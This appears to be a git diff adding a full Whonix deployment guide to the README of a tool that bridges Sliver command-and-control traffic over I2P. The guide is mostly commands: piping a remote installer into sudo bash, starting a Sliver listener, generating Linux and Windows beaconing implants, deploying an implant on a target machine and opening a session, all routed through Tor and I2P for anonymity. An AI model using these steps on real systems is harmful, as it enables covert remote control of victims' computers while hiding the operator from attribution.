@@ -124,25 +124,139 @@ sliver-i2p-bridge stop
   Signal running bridge to shutdown (use Ctrl+C)
 ```
 
-## Whonix Deployment
+## Whonix Deployment (Full Guide)
 
-For maximum anonymity, run on Whonix-Workstation:
+For maximum anonymity, run everything on Whonix-Workstation.
+
+### Step 1: Transfer to Whonix
 
 ```bash
-# Copy to Whonix
-scp -r sliver-i2p-bridge user@whonix-ws:~/
-
-# Run installer
-ssh user@whonix-ws
+# Option A: Clone from GitHub (on Whonix-Workstation)
+git clone https://github.com/QuickestRound/sliver-i2p-bridge.git
 cd sliver-i2p-bridge
-chmod +x scripts/install-whonix.sh
-./scripts/install-whonix.sh
+
+# Option B: SCP from host machine
+scp -r sliver-i2p-bridge user@whonix-ws:~/
 ```
 
-**Whonix notes:**
-- I2P traffic routes through Tor first (Tor → I2P), adding latency but increasing anonymity
-- I2P does NOT support stream isolation — restart I2P between sensitive operations
-- Use generous beacon intervals (30s+) to account for latency
+### Step 2: Run Installer Script
+
+```bash
+chmod +x scripts/install-whonix.sh
+sudo ./scripts/install-whonix.sh
+```
+
+This installs: I2P with SAM bridge, Go 1.21, builds the bridge binary, sets up systemd.
+
+### Step 3: Wait for I2P Bootstrap
+
+```bash
+# Check I2P status
+sudo systemctl status i2p
+
+# Watch the I2P console (wait for "Network: OK")
+# Open in browser: http://127.0.0.1:7657
+
+# This takes 5-10 minutes on first start!
+```
+
+### Step 4: Install Sliver
+
+```bash
+# Download and install Sliver
+curl https://sliver.sh/install | sudo bash
+
+# Start Sliver server (in one terminal)
+sliver-server
+
+# Start HTTPS listener on localhost
+sliver > https -L 127.0.0.1 -l 8443
+
+# Keep this terminal open!
+```
+
+### Step 5: Start the Bridge
+
+```bash
+# In a new terminal
+cd ~/sliver-i2p-bridge
+./sliver-i2p-bridge start --sliver-port 8443
+
+# You'll see:
+# [+] B32 Address: xxxxxxxx.b32.i2p
+# [+] Bridge is READY!
+
+# SAVE THIS B32 ADDRESS - you need it for implants!
+```
+
+### Step 6: Generate Implant
+
+```bash
+# Back in Sliver console
+sliver > generate --http http://<YOUR_B32_ADDRESS>.b32.i2p \
+                  --os linux \
+                  --arch amd64 \
+                  --beacon-interval 30s \
+                  --save /tmp/implant
+
+# For Windows target:
+sliver > generate --http http://<YOUR_B32_ADDRESS>.b32.i2p \
+                  --os windows \
+                  --arch amd64 \
+                  --beacon-interval 30s \
+                  --save /tmp/implant.exe
+```
+
+### Step 7: Deploy Implant on Target
+
+Target machine MUST have I2P installed with HTTP proxy enabled:
+
+```bash
+# On target: Install I2P
+sudo apt install i2p
+sudo systemctl start i2p
+
+# Wait for I2P to bootstrap (5-10 min)
+
+# Run implant with I2P proxy
+HTTP_PROXY=http://127.0.0.1:4444 ./implant
+```
+
+### Step 8: Receive Session
+
+```bash
+# Back in Sliver console, you should see:
+# [*] Session opened...
+
+sliver > sessions
+sliver > use <SESSION_ID>
+```
+
+### Whonix-Specific Notes
+
+| Topic | Details |
+|-------|---------|
+| **Traffic Path** | Target → I2P → (Tor via Whonix) → I2P → Bridge → Sliver |
+| **Latency** | Expect 5-30s for commands due to Tor+I2P overhead |
+| **Beacon Interval** | Use `--beacon-interval 30s` minimum |
+| **Stream Isolation** | I2P doesn't support it — restart I2P between ops |
+| **Persistent Address** | Use `--persist-keys` to keep same B32 across restarts |
+
+### Running as Systemd Service
+
+```bash
+# Start bridge as service
+sudo systemctl start sliver-i2p-bridge
+
+# Enable on boot
+sudo systemctl enable sliver-i2p-bridge
+
+# Check status
+sudo systemctl status sliver-i2p-bridge
+
+# View logs
+journalctl -u sliver-i2p-bridge -f
+```
 
 ## Architecture
 
